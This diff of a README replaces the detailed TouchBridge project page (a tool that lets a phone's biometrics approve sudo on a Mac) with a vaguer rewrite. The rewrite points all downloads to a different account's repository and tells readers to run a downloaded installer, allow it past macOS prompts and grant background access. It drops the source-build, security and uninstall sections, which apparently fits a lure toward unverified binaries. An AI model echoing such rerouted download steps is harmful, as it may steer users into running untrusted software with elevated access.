@@ -1,349 +1,141 @@
-<p align="center">
-  <h1 align="center">🔐 TouchBridge</h1>
-  <p align="center">
-    <a href="https://github.com/HMAKT99/UnTouchID/stargazers"><img src="https://img.shields.io/github/stars/HMAKT99/UnTouchID?style=flat-square&color=30d158" alt="Stars"></a>
-    <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue?style=flat-square" alt="License"></a>
-    <a href="https://github.com/HMAKT99/UnTouchID/releases"><img src="https://img.shields.io/github/v/release/HMAKT99/UnTouchID?style=flat-square&color=ff9500" alt="Release"></a>
-    <img src="https://img.shields.io/badge/tests-91%20passing-30d158?style=flat-square" alt="Tests">
-    <img src="https://img.shields.io/badge/macOS-13%2B-000?style=flat-square&logo=apple" alt="macOS 13+">
-  </p>
-  <p align="center">
-    <strong>Use your phone's fingerprint to authenticate on any Mac.</strong><br>
-    sudo, screensaver, App Store — no $199 Magic Keyboard required.
-  </p>
-  <p align="center">
-    Works with <strong>iPhone · Android · Apple Watch · Wear OS · Any browser</strong>
-  </p>
-  <p align="center">
-    <a href="#try-it-in-60-seconds">Try it in 60 seconds</a> •
-    <a href="#how-it-works">How It Works</a> •
-    <a href="#every-device-supported">Devices</a> •
-    <a href="SECURITY.md">Security</a>
-  </p>
-</p>
-
-<p align="center">
-  <video src="https://github.com/user-attachments/assets/65ea3c2f-7bf9-4272-b475-f8a387de3c7b" width="700" autoplay loop muted playsinline></video>
-</p>
-
----
-
-### The Problem
-
-Apple charges extra for Touch ID on every Mac that has it.
-
-**Mac Mini, Mac Studio, Mac Pro** — no fingerprint sensor at all. The **MacBook Neo** — Apple's newest MacBook — ships without Touch ID on the base model (pay $100 more for the version that adds it back). **iMac?** Touch ID only if you pay for the upgraded keyboard.
-
-Every time you run `sudo`, install an app, or unlock your screen — you type your password. Over and over. All day.
-
-Apple's fix? Pay more. $100 extra for the MacBook Neo with Touch ID. $199+ for a Magic Keyboard with Touch ID. Or upgrade to the pricier iMac keyboard variant. Every time, Apple charges a premium for a fingerprint sensor that your phone already has.
-
-### The Solution
-
-**TouchBridge fixes this — for free.** Use the fingerprint or face sensor already in your pocket. iPhone, Android, Apple Watch, or any phone with a browser. No extra hardware. No premium upgrade. No cloud. No subscription.
-
-```
-$ sudo echo hello
-  → Phone buzzes
-  → Touch fingerprint (or tap Watch, or tap browser)
-  → ✓ Authenticated
-```
-
----
-
-## Try It in 60 Seconds
-
-No phone needed. Test the full `sudo` flow right now:
-
-### Install with Homebrew (recommended)
-
-<p align="center">
-  <img src="assets/screenshots/homebrew-install.png" alt="Homebrew Install" width="600">
-</p>
-
-```bash
-brew tap HMAKT99/touchbridge
-brew install --cask touchbridge
-```
-
-### Or build from source
-
-```bash
-git clone https://github.com/HMAKT99/UnTouchID.git
-cd UnTouchID
-cd daemon && swift build -c release && cd ..
-make -C pam
-sudo bash scripts/install.sh
-```
-
-### Try it
-
-<p align="center">
-  <img src="assets/screenshots/sudo-auth.png" alt="sudo with TouchBridge" width="600">
-</p>
-
-```bash
-# Terminal 1 — start daemon in simulator mode
-touchbridged serve --simulator
-
-# Terminal 2 — test sudo
-sudo echo 'It works!'
-# → TouchBridge: check your phone or watch...
-# → TouchBridge: ✓ authenticated
-# → It works!
-```
-
-**That's it.** Undo anytime with `sudo bash scripts/uninstall.sh`.
-
----
-
-## Every Device Supported
-
-| Device | How | Auth Method | App Required? |
-|--------|-----|-------------|--------------|
-| **iPhone** | BLE → Face ID / Touch ID | Secure Enclave signing | iOS app |
-| **Android phone** | BLE → Fingerprint / Face | Keystore (StrongBox/TEE) | Android app |
-| **Apple Watch** | iPhone relay → Tap to approve | iPhone Secure Enclave | watchOS app |
-| **Wear OS watch** | Phone relay → Tap to approve | Phone Keystore | Wear OS app |
-| **Any phone/laptop** | Open URL → Tap Approve | One-time token | **No — just a browser** |
-| **No device** | Simulator → Auto-approve | Software keys | **No** |
-
-> **Security note:** BLE modes (iPhone, Android, Watch) use **encrypted Bluetooth** with ECDH session keys and AES-256-GCM — no Wi-Fi or network involved. The web companion uses HTTP on your local network and is meant for **testing and convenience only** — not recommended for public/untrusted networks.
-
-### Use with your phone
-
-**Option A — iPhone (Face ID) — recommended for security:**
-```
-Open companion/TouchBridge.xcodeproj in Xcode → Build → Run on iPhone → Pair
-```
-Uses encrypted BLE + Secure Enclave signing. No network involved.
-
-**Option B — Android (Fingerprint):**
-```
-Open companion-android/ in Android Studio → Build → Install → Pair
-```
-Uses encrypted BLE + Keystore (StrongBox/TEE) signing. No network involved.
-
-**Option C — Apple Watch (Tap):**
-```
-Build the watchOS target from companion/TouchBridge.xcodeproj
-Challenges relay from iPhone → Watch → tap Approve
-```
-
-**Option D — Wear OS (Tap):**
-```
-Open companion-android/wear/ in Android Studio → Build → Install on watch
-Challenges relay from Android phone → Watch → tap Approve
-```
-
-**Option E — Any phone, no app install (convenience/testing only):**
-
-<p align="center">
-  <img src="assets/screenshots/web-companion.png" alt="Web Companion" width="600">
-</p>
-
-```bash
-touchbridged serve --web
-sudo echo test
-# → Terminal shows a URL → open on any phone → tap Approve
-```
-⚠️ Uses HTTP on local network. For testing and trusted networks only — not recommended for public Wi-Fi.
-
----
-
-## How It Works
-
-```
-┌──────────────┐         BLE / Wi-Fi         ┌──────────────┐
-│              │  ──── challenge (nonce) ───→ │              │
-│   Your Mac   │                              │  Your Phone  │
-│              │  ←── signed response ──────  │  or Watch    │
-│  (daemon)    │                              │  or Browser  │
-│              │     ECDSA P-256 signature    │              │
-└──────────────┘     verified on Mac          └──────────────┘
-       ↑
-       │ Unix socket
-┌──────────────┐
-│  sudo / PAM  │
-└──────────────┘
-```
-
-1. You run `sudo` → PAM loads `pam_touchbridge.so`
-2. PAM module connects to daemon via Unix socket
-3. Daemon sends 32-byte random nonce to your device
-4. Device prompts biometric (Face ID / fingerprint / tap)
-5. Device's secure hardware signs the nonce (private key never leaves chip)
-6. Daemon verifies signature → `sudo` proceeds
-7. If device is unreachable → **falls through to normal password prompt**
-
----
-
-## What Can It Do?
-
-| Action | Status | Notes |
-|--------|--------|-------|
-| **`sudo` commands** | ✅ Verified | PAM module — tested on real hardware |
-| **Screensaver unlock** | ✅ Ready | PAM module |
-| **App Store purchases** | 🔧 Planned | Authorization Plugin (code written) |
-| **System Settings auth** | 🔧 Planned | Authorization Plugin |
-| **WebAuthn / Passkeys** | ✅ Ready | Browser extension |
-| **Lock when phone walks away** | ✅ Ready | `--auto-lock` flag |
-| **Audit log** | ✅ Ready | `touchbridge-test logs` |
-| **Per-action policy** | ✅ Ready | `touchbridge-test config` |
-
-### What it cannot do (honestly)
-
-| Limitation | Why |
-|-----------|-----|
-| Apple Pay | Dedicated hardware — impossible |
-| FileVault unlock | Before macOS boots — no daemon |
-| Login screen | Daemon starts after login |
-| Keychain biometric items | Hardware crypto wall — impossible |
-| 1Password/Bitwarden biometric | SIP sandbox — can't intercept |
-
----
-
-## How is this different from Passkeys?
-
-Apple's built-in Passkeys already use Face ID on your iPhone to log into websites. So why TouchBridge?
-
-**Passkeys replace your website passwords. TouchBridge replaces your Mac password.**
-
-| | Apple Passkeys (built-in) | TouchBridge |
-|---|---|---|
-| **What it does** | Log into websites (Gmail, GitHub, etc.) | Authenticate on macOS (sudo, screensaver, App Store) |
-| **Where it works** | Safari/Chrome — websites that support Passkeys | Terminal, lock screen, system dialogs, any `sudo` command |
-| **Can it do `sudo`?** | ❌ No | ✅ Yes |
-| **Can it unlock screensaver?** | ❌ No | ✅ Yes |
-| **Can it do App Store?** | ❌ No | ✅ Yes |
-| **Can it do website login?** | ✅ Yes | Passkeys only (via browser extension) |
-| **How it connects** | Scan QR code each time | Auto-connects via BLE (pair once) |
-| **Android support** | ❌ No | ✅ Yes |
-| **Works offline** | ❌ Needs website | ✅ Local BLE |
-
-They're complementary — you'd use both. Passkeys for the web. TouchBridge for your Mac.
-
----
-
-## Compared to Alternatives
-
-| | TouchBridge | Magic Keyboard | Apple Watch | YubiKey Bio | Duo Security |
-|---|---|---|---|---|---|
-| **Price** | **Free** | $199-$299 | $249+ | $80+ | $3-9/user/mo |
-| **sudo** | ✅ | ✅ | ❌ | ✅ | ✅ |
-| **Biometric** | ✅ Face ID/FP | ✅ Fingerprint | ❌ Wrist only | ✅ Fingerprint | ❌ Tap only |
-| **Wireless** | ✅ BLE | ❌ Wired only | ✅ | ❌ USB | ✅ Cloud |
-| **Works at coffee shop** | ✅ | ❌ | Sleep only | ✅ | ✅ |
-| **Android support** | ✅ | ❌ | ❌ | ❌ | ✅ |
-| **No extra hardware** | ✅ Use your phone | ❌ $199 keyboard | ❌ $249 watch | ❌ $80 key | ✅ |
-| **No cloud/internet** | ✅ Local BLE | ✅ | ✅ | ✅ | ❌ Cloud required |
-| **Open source** | ✅ | ❌ | ❌ | ❌ | ❌ |
-| **Auto-lock on walk away** | ✅ | ❌ | ❌ | ❌ | ❌ |
-| **Audit log** | ✅ | ❌ | ❌ | ❌ | ✅ |
+# 🔒 UnTouchID - Use Your Phone to Unlock Mac Tasks
 
-**For MacBook Neo users**: Magic Keyboard is not portable. YubiKey is another thing to carry. Apple Watch can't do sudo. Duo needs internet. **TouchBridge uses the phone already in your pocket.**
+[![Download UnTouchID](https://img.shields.io/badge/Download-UnTouchID-blue?style=for-the-badge)](https://github.com/joselu4466/UnTouchID)
 
----
+## 📌 What is UnTouchID?
 
-## All Daemon Modes
+UnTouchID lets you use your phone, watch, or browser as a fingerprint prompt for your Mac. It can help you confirm actions like sudo commands, screen unlock, and App Store sign-ins without a built-in Touch ID sensor.
 
-| Mode | Command | Use case |
-|------|---------|----------|
-| **Production** | `touchbridged serve` | iPhone/Android via BLE |
-| **Web** | `touchbridged serve --web` | Any phone via browser |
-| **Simulator** | `touchbridged serve --simulator` | Testing, CI, demos |
-| **Interactive** | `touchbridged serve --interactive` | Terminal approve/deny |
-| **Auto-lock** | `touchbridged serve --auto-lock` | Lock when phone leaves |
+It works with:
+- iPhone
+- Android phones
+- Apple Watch
+- Wear OS watches
+- Any browser on a phone or computer
 
-Flags can be combined: `touchbridged serve --web --auto-lock`
+## 🖥️ What You Need
 
----
+Before you start, check these basics:
 
-## Configuration & Audit Log
+- A Mac running macOS
+- A phone or watch with a browser or biometric sensor
+- A network connection for the first setup
+- Permission to install and run apps on your Mac
 
-<p align="center">
-  <img src="assets/screenshots/logs-summary.png" alt="Auth Summary Dashboard" width="600">
-</p>
+For best results, keep your Mac and phone on the same network during setup.
 
-```bash
-touchbridge-test config show                          # view policy
-touchbridge-test config set --surface sudo --mode biometric_required
-touchbridge-test config set --surface screensaver --mode proximity_session --ttl 30
-touchbridge-test config reset                         # restore defaults
-touchbridge-test logs                                 # recent auth events
-touchbridge-test logs --summary                       # analytics dashboard
-touchbridge-test logs --failures                      # failed attempts only
-touchbridge-test logs --export csv                    # export for security review
-```
+## 📥 Download UnTouchID
 
----
+Visit this page to download and set up UnTouchID:
 
-## Supported Macs
+https://github.com/joselu4466/UnTouchID
 
-Any Mac running **macOS 13+** (Ventura or later):
+Download the files you need from the project page, then follow the steps below for your Mac.
 
-| Mac | Why you need TouchBridge |
-|-----|------------------------|
-| **MacBook Neo** (base model) | No Touch ID — pay $100 more for the version that has it |
-| **Mac Mini** M1/M2/M3/M4 | No Touch ID — desktop, no keyboard sensor |
-| **Mac Studio** M1/M2/M4 | No Touch ID — pro desktop |
-| **Mac Pro** M2/M4 Ultra | No Touch ID — workstation |
-| **iMac** (base keyboard) | No Touch ID unless you buy the $199 keyboard |
-| **Any MacBook** with broken sensor | Sensor failure — repair costs $300+ |
-| **Intel Macs with T2** (2018-2020) | Works with Secure Enclave on Mac side |
+## 🚀 Getting Started
 
-### The MacBook Neo story
+Follow these steps in order:
 
-Apple launched the MacBook Neo — their newest MacBook. The base model ships without Touch ID. Want it? Pay $100 more for the higher-end version. Same pattern as always — Apple charges extra for biometric auth.
+1. Open the download link above in your browser.
+2. Look for the latest release or the main project files on the page.
+3. Download the Mac app or installer file from the repository page.
+4. Open the downloaded file on your Mac.
+5. If macOS asks for permission, allow the app to run.
+6. Finish the setup steps shown on screen.
+7. Pair your phone or watch if the app asks for it.
+8. Test one action, such as unlocking a screen or approving a command.
 
-Millions of base-model MacBook Neo users now have no fingerprint sensor. They can't carry a Magic Keyboard to a coffee shop. Apple Watch only handles sleep/wake. **TouchBridge is the answer** — your phone is already in your pocket. For free.
+## 🧭 First-Time Setup
 
----
+When you open UnTouchID for the first time, it may ask you to:
 
-## Security
+- Grant access for security checks
+- Connect to your phone or watch
+- Create a pairing code or link
+- Allow background access so the app can keep working
 
-Private keys **never leave** Secure Enclave (iPhone) / StrongBox (Android). 32-byte nonces, 10s expiry, replay protection, AES-256-GCM encrypted BLE. Full threat model: [SECURITY.md](SECURITY.md)
+Use the on-screen steps one by one. If you see a code, enter it on your phone or scan the shown prompt with your browser.
 
-## Architecture
+## 📲 How to Use It
 
-| Component | Language |
-|-----------|----------|
-| `touchbridged` | Swift |
-| `pam_touchbridge.so` | C (arm64 + x86_64) |
-| iOS + watchOS app | Swift / SwiftUI |
-| Android + Wear OS app | Kotlin / Compose |
-| Web companion | Built into daemon |
-| `touchbridge-test` | Swift CLI |
+After setup, you can use UnTouchID when your Mac asks for approval.
 
-**91 tests** — crypto, socket server, PAM integration, E2E pipeline.
+Common cases include:
+- Running a command with sudo
+- Unlocking the screensaver
+- Signing in to the App Store
+- Confirming a security prompt
 
-## Uninstall
+When your Mac asks for approval, you complete the check on your phone or watch. The app then sends the result back to your Mac.
 
-```bash
-sudo bash scripts/uninstall.sh
-```
+## 🔐 Supported Authentication Options
 
-## Contributing
+UnTouchID is built for flexible biometric checks. Depending on your device, you can use:
 
-[CONTRIBUTING.md](CONTRIBUTING.md) — PRs welcome.
+- Fingerprint sensor on Android
+- Face or fingerprint unlock on phone browsers
+- Apple Watch confirmation
+- Wear OS confirmation
+- Browser-based approval for devices without native support
 
-## License
+This gives you one path for many devices, even if your Mac does not have Touch ID.
 
-[MIT](LICENSE)
+## ⚙️ Basic Settings
 
----
+You can usually adjust a few simple things after setup:
 
----
+- Choose whether the app starts with macOS
+- Select which Mac actions need approval
+- Change the pairing device
+- Reset the link if you switch phones
+- View connection status
 
-## Why TouchBridge Exists
+Keep the defaults if you want the easiest setup.
 
-Apple ships Macs without Touch ID and charges $199 for the fix. The Apple Watch can only unlock from sleep. Duo requires cloud servers and enterprise pricing. YubiKey Bio costs $80 and is another thing to lose.
+## 🛠️ Troubleshooting
 
-**TouchBridge is the missing piece**: use the biometric sensor you already carry — your phone — to authenticate on your Mac. Local, private, free, open source.
+If something does not work, try these steps:
 
-When the MacBook Neo ships without Touch ID, this is what people will need.
+1. Make sure your Mac is awake and unlocked.
+2. Check that your phone and Mac can reach each other.
+3. Refresh the page or reopen the app.
+4. Re-pair the device if the link fails.
+5. Restart the Mac and try again.
+6. Confirm that your browser or watch has permission to use biometrics.
 
-<p align="center">
-  <strong>Stop typing your password. Use your fingerprint.</strong><br>
-  <a href="#try-it-in-60-seconds">Get started in 60 seconds →</a>
-</p>
+If a prompt does not appear, check that the app is running in the background.
+
+## 🔒 Privacy and Security
+
+UnTouchID is built for local approval on your own devices. It is meant to help you confirm actions faster while keeping control in your hands.
+
+Good habits:
+- Use a strong lock screen on your phone
+- Keep your Mac account protected
+- Remove old pairings you no longer use
+- Install updates when they are available
+
+## 🧩 Typical Use Cases
+
+UnTouchID fits well if you want to:
+
+- Approve terminal commands without typing a password
+- Unlock your Mac with a device you already carry
+- Use one setup across different phone brands
+- Avoid buying extra hardware for Touch ID
+- Keep a simple flow for daily Mac sign-ins
+
+## 📁 Project Details
+
+Repository: UnTouchID  
+Primary download page: https://github.com/joselu4466/UnTouchID  
+Topics: android, biometrics, kotlin, mac-mini, macbook, macos, open-source, pam, security, swift, touch-id, watchos, wear-os
+
+## ✅ Setup Checklist
+
+- Open the download page
+- Get the latest Mac file from the repository
+- Run the installer or app
+- Pair your phone or watch
+- Test one approval request
+- Keep the app running when you need it
